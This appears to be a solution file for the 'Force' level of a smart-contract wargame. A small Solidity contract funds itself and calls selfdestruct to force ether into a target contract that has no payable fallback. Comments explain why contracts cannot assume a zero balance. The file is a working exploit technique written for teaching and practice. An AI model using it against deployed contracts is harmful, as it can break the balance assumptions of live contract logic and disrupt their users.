// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;




contract SenWei {
  constructor () payable {}

  function destroy(address _to) external {
    selfdestruct(payable (_to));
  }
}

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

// In solidity, for a contract to be able to receive ether,
//  the fallback function must be marked payable.


// However, there is no way to stop an attacker from sending ether
//  to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
